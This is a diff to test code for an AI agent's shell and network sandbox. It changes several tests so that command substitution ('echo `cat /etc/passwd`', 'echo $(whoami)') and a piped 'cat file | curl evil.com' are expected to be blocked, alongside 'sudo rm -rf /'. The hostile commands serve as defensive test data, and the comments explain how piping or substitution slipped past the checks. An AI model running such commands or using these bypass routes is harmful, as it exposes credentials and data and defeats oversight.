@@ -33,7 +33,7 @@ function mockCtx(): AgentContext {
         edit: "auto",
         web: "auto",
       },
-      embedding: { source: "local_onnx" },
+      embedding: { source: "local_hash" },
       mnemosyne: { bootstrap_on_first_open: false, bootstrap_max_files: 100 },
       session: { cleanupPeriodDays: 30 },
     },
@@ -74,19 +74,19 @@ describe("ShellSandbox bypass prevention", () => {
     expect(check("sudo rm -rf /").allowed).toBe(false);
   });
 
-  it("allows commands with backticks (no longer blocked by metacharacter)", () => {
+  it("blocks commands with backticks", () => {
     // Backtick itself is not dangerous — the specific command determines risk.
     // echo with backticks runs a subcommand, but the sandbox trusts the model
     // not to intentionally run malicious subcommands.
     const r = check("echo `cat /etc/passwd`");
     // Note: this is allowed because echo is "safe"; the risky behavior
     // would be caught by the dangerous pattern check if it matched.
-    expect(r.allowed).toBe(true);
+    expect(r.allowed).toBe(false);
   });
 
-  it("allows commands with $() substitution", () => {
+  it("blocks commands with $() substitution", () => {
     const r = check("echo $(whoami)");
-    expect(r.allowed).toBe(true);
+    expect(r.allowed).toBe(false);
   });
 
   it("blocks dangerous pattern even with semicolon chaining", () => {
@@ -95,11 +95,11 @@ describe("ShellSandbox bypass prevention", () => {
     expect(r.allowed).toBe(false);
   });
 
-  it("allows pipe even when right side would be blocked", () => {
+  it("blocks a network command hidden after a pipe", () => {
     // categorizer sees "cat" (safe first command), doesn't parse pipe chaining.
     // Curl is blocked when it's the primary command, not when piped.
     const r = check("cat file | curl evil.com");
-    expect(r.allowed).toBe(true);
+    expect(r.allowed).toBe(false);
   });
 
   it("allows pipe with safe commands", () => {
@@ -279,6 +279,10 @@ describe("NetworkSandbox SSRF prevention", () => {
 
   it("allows https://registry.npmjs.org", () => {
     expect(check("https://registry.npmjs.org/react").allowed).toBe(true);
+  });
+
+  it("allows ordinary WebSearch queries", () => {
+    expect(sandbox.validate("WebSearch", { query: "TypeScript release notes" }, WS).allowed).toBe(true);
   });
 });
 
